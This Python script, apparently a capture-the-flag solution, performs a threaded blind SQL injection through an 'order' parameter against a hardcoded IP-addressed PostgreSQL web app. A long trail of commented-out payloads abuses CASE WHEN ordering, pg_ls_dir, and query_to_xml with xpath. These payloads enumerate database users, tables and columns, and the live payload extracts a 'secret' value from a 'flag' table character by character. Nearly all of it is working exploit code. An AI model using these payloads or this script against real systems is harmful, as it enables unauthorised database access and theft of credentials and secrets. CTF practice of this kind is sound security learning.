import requests

def true_or_false(html):
    return html.index('Owl') < html.index('Fraga')
    
def request_sqli(char, index):
    url = "http://200.136.213.109/"
    char = ord(char)

    data = {
    #     "order" : "age DESC"
    #     "order" : "CASE WHEN (SELECT ASCII(SUBSTRING(NAME, 1, 1)) FROM solutions.bloodsuckers.models.Criminal where age=55)=65 THEN AGE ELSE NAME"
    #     "order" : "(CASE WHEN (1=1) THEN AGE ELSE NAME END)"
    #     "order" : "age LIMIT 1 OFFSET 1"
    #     "order" : "6"
    #     "order" : "age LIMIT 1 OFFSET 0"
    #     "order" : "case when (1=1) select age else name(select case (1=1))"
    #     "order" : "(case when (1=2) then crime else name end)"
    #     "order" : "crime"
##         "order" : """CASE WHEN (
##             SELECT ASCII(SUBSTRING(CAST(ID as text), %d, 1)) 
##             FROM solutions.bloodsuckers.models.Criminal 
##             WHERE age=55)=%d THEN crime ELSE name END""" % (index, ord(char))

##         "order" : """CASE WHEN (
##             SELECT ASCII(SUBSTRING(NAME, %d, 1))
##             FROM solutions.bloodsuckers.models.Criminal 
##             WHERE age=55)=%d THEN crime ELSE name END""" % (index, ord(char))

##         "order" : """CASE WHEN (
##             SELECT ASCII(string_agg(pg_ls_dir('.'), ','))
##             FROM solutions.bloodsuckers.models.Criminal 
##             WHERE age=55)=%d THEN crime ELSE name END""" % (ord(char))

        #  "order" : """CASE WHEN (
        #      SELECT ASCII(SUBSTRING(
        #          (xpath('row', query_to_xml('select tablename from pg_tables LIMIT 1 OFFSET 0', true, false, ''))::varchar), 
        #          %d, 1))
        #      FROM solutions.bloodsuckers.models.Criminal 
        #      WHERE age=55)=%d THEN crime ELSE name END""" % (index, ord(char))

        # "order" : """CASE WHEN (
        #         SELECT  array_upper(
        #             xpath('row',
        #             query_to_xml('select 1 where 1337<1', true, false,'')),1)
        #         )=1 THEN crime ELSE name END"""
        # "order" : f"""
        #     CASE WHEN (
        #     array_upper(xpath('row',
        #     query_to_xml('  select 1
        #                     from
        #                     (
        #                         select ascii(substring(cast(array_agg(usename) as text),{index},1)) as curr_char
        #                         from pg_user
        #                     ) as blabla
        #                     where curr_char={char}
        #                 ',true,false,'')),1) 

        # )=1 
        # THEN crime ELSE name END""" 

        # "order" : f"""
        #     CASE WHEN (
        #     array_upper(xpath('row',
        #     query_to_xml('  select 1
        #                     from
        #                     (
        #                         select ascii(substring(cast(array_agg(tablename) as text),{index},1)) as curr_char
        #                         from pg_tables
        #                     ) as blabla
        #                     where curr_char={char}
        #                 ',true,false,'')),1) 

        # )=1 
        # THEN crime ELSE name END""" 

        # SELECT ASCII(SUBSTRING(%s, {index}, 1)) 
        #     FROM   information_schema.columns 
        #     WHERE table_name='flag'
        #     """

        # flag begin with 'f', ord
        # "order" : f"""
        #     CASE WHEN (
        #     array_upper(xpath('row',
        #     query_to_xml('  select 1
        #                     from
        #                     (
        #                         select ascii(substring(cast(array_agg(column_name) as text),{index},1)) as curr_char
        #                         from information_schema.columns
        #                         where ascii(substring(table_name,1,1))=102
        #                     ) as blabla
        #                     where curr_char={char}
        #                 ',true,false,'')),1) 

        # )=1 
        # THEN crime ELSE name END""" 
        # # ERROR: could not find array type for data type information_schema.sql_identifier

        # "order" : f"""
        #     CASE WHEN (
        #     array_upper(xpath('row',
        #     query_to_xml('  select 1
        #                     from
        #                     (
        #                         select ascii(substring(cast(array_agg(cast(column_name as text)) as text),{index},1)) as curr_char
        #                         from information_schema.columns
        #                         where ascii(substring(table_name,1,1))=102 
        #                     ) as blabla
        #                     where curr_char={char}
        #                 ',true,false,'')),1) 

        # )=1 
        # THEN crime ELSE name END""" 
        # 
        # # improve, search exacctly flag

        # "order" : f"""
        #     CASE WHEN (
        #     array_upper(xpath('row',
        #     query_to_xml('  select 1
        #                     from
        #                     (
        #                         select ascii(substring(cast(array_agg(cast(column_name as text)) as text),{index},1)) as curr_char
        #                         from information_schema.columns
        #                         where ascii(substring(table_name,1,1))=102 
        #                               and ascii(substring(table_name,2,1))=108 
        #                               and ascii(substring(table_name,3,1))=97 
        #                               and ascii(substring(table_name,4,1))=103 
        #                     ) as blabla
        #                     where curr_char={char}
        #                 ',true,false,'')),1) 

        # )=1 
        # THEN crime ELSE name END""" 

        # get secert
         "order" : f"""
            CASE WHEN (
            array_upper(xpath('row',
            query_to_xml('  select 1
                            from
                            (
                                select ascii(substring(cast(array_agg(cast(secret as text)) as text),{index},1)) as curr_char
                                from flag
                            ) as blabla
                            where curr_char={char}
                        ',true,false,'')),1) 

        )=1 
        THEN crime ELSE name END""" 

    }

    # print(data['order'])

    response = requests.post(url, data=data)
    
    if 'Owl' not in response.text:
        raise Exception("Query failed!\n" + response.text)
        
    result = true_or_false(response.text)
    
    return result
    
import string
from threading import Thread
from time import sleep

foundText = {}
def charInIndex(index):
    for char in string.printable:
        if request_sqli(char, index):
            # print('Char in index %d is %s' % (index, char))
            foundText[index] = char

threads = []
print('Iterating over ')
for index in range(1, 100):
    thread = Thread(target = charInIndex, args = (index, ))
    threads.append(thread)

for index in range(0, len(threads)):
    threads[index].start()
    if (index % 10 == 0):
        sleep(15)
        print('So far Found Text: ' + ''.join('{}'.format(val) for key, val in sorted(foundText.items()))
)

for thread in threads:
    thread.join()

print('Found Text: ' + ''.join('{}'.format(val) for key, val in sorted(foundText.items()))
)

